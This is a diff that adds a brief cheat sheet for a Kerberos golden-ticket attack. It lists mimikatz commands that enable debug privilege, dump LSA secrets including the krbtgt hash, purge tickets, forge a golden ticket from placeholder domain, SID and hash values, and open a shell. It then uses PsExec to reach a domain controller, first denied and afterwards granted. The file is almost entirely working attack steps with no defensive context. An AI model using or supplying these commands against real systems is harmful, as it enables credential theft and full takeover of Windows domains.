@@ -1,0 +1,13 @@
+PsExec64.exe \\<dc_host> cmd.exe #ACCESS DENIED!
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+#purge tickets
+mimikatz # kerberos::purge
+#sid get through whoami /user
+mimikatz # kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<NTLM>
+#launch the command prompt
+mimikatz # misc::cmd
+
+
+PsExec.exe \\<dc_host> cmd.exe #ACCESS SUCCESSFULL
+
